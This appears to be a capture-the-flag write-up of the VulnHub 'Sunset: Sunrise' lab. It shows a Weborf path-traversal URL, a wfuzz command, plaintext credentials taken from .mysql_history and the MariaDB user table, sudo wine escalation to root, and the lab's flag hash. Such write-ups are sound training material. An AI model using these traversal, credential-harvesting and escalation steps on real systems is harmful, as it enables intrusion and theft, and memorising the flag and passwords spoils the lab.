# Sunset: Sunrise

https://www.vulnhub.com/entry/sunset-sunrise,406/

## Reconnaisance

A quick nmap over all ports only revealed 22, 80, 3306 and 8080 open. No FTP this time.

Port 80 is hosting some sort of default nginx file, while 8080 seems to be hosting the var/www folder using something called Weborf/0.12.2. It showed html/ and when I clicked through, it contained `index.nginx-debian.html` that showed the same content as port 80.

Looking up Weborf with that version, it is vulnerable to path traversal when using encoding slashes, and testing this proved I could navigate throughout the machine.

## Exploring and wfuzz

I browsed around the machine, but couldn't find anything. I could reach the weborf home directory, but couldn't see anything in there. Following a hint, I decided to use wfuzz on it.

The path to show the directory was `http://192.168.53.7:8080/..%2f..%2fhome%2fweborf%2f`, and a useful wordlist for local user directory fuzzing is `/usr/share/wordlists/dirb/common.txt` on kali.

The following wfuzz command found several files: `wfuzz -w /usr/share/wordlists/dirb/common.txt --sc 200 http://192.168.53.7:8080/..%2f..%2fhome%2fweborf%2fFUZZ`:

```
********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://192.168.53.7:8080/..%2f..%2fhome%2fweborf%2fFUZZ
Total requests: 4614

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                          
===================================================================

000000001:   200        2 L      18 W     439 Ch      ""                                                                                                                               
000000003:   200        113 L    483 W    3526 Ch     ".bashrc"                                                                                                                        
000000016:   200        2 L      8 W      83 Ch       ".mysql_history"                                                                                                                 
000000019:   200        27 L     130 W    807 Ch      ".profile"                                                                                                                       

Total time: 13.47158
Processed Requests: 4614
Filtered Requests: 4610
Requests/sec.: 342.4987
```

Opening .mysql_history revealed:

```
show databases;
ALTER USER 'weborf'@'localhost' IDENTIFIED BY 'iheartrainbows44'; 
```

While I couldn't remote connect with mysql using the above, it did work for ssh.

## Mysql and sunrise

Once in as weborb, I looked around. Couldn't sudo -l, and my already thorough exploration told me little else was around. However, the entry above from the history table told me that while weborf couldn't connect to sql remotely, it could locally.

`mysql -p` plus the same password `iheartrainbows44` got me in to mysql, and I selected from the users table:

```
MariaDB [(none)]> select user, password from mysql.user;
+---------+-------------------------------------------+
| user    | password                                  |
+---------+-------------------------------------------+
| root    | *C7B6683EEB8FF8329D8390574FAA04DD04B87C58 |
| sunrise | thefutureissobrightigottawearshades       |
| weborf  | *A76018C6BB42E371FD7B71D2EC6447AE6E37DB28 |
+---------+-------------------------------------------+
3 rows in set (0.000 sec)

MariaDB [(none)]>
```

I was able to use the above password to `su sunrise`.

## Wine, CMD.exe, type

`sudo -l` revealed that sunrise could run /usr/bin/wine, a program for running windows executables under windows. Inside the sunrise home directory I had already discovered .wine, containing a windows file system. Using `sudo /usr/bin/wine cmd.exe` I was able to start a windows command prompt, helpfully running as root on the windows system. I had also discovered that the `z:` wine drive was hosting the linux file system, so used window's equivalent of `cat`, `type.exe` to read the root flag (after using `dir` to find it):

```
Z:\>cd root

Z:\root>type root.txt
            ^^                   @@@@@@@@@
       ^^       ^^            @@@@@@@@@@@@@@@
                            @@@@@@@@@@@@@@@@@@              ^^
                           @@@@@@@@@@@@@@@@@@@@
 ~~~~ ~~ ~~~~~ ~~~~~~~~ ~~ &&&&&&&&&&&&&&&&&&&& ~~~~~~~ ~~~~~~~~~~~ ~~~
 ~         ~~   ~  ~       ~~~~~~~~~~~~~~~~~~~~ ~       ~~     ~~ ~
   ~      ~~      ~~ ~~ ~~  ~~~~~~~~~~~~~ ~~~~  ~     ~~~    ~ ~~~  ~ ~~
   ~  ~~     ~         ~      ~~~~~~  ~~ ~~~       ~~ ~ ~~  ~~ ~
 ~  ~       ~ ~      ~           ~~ ~~~~~~  ~      ~~  ~             ~~
       ~             ~        ~      ~      ~~   ~             ~

Thanks for playing! - Felipe Winsnes (@whitecr0wz)

24edb59d21c273c033aa6f1689b0b18c

Z:\root>
```
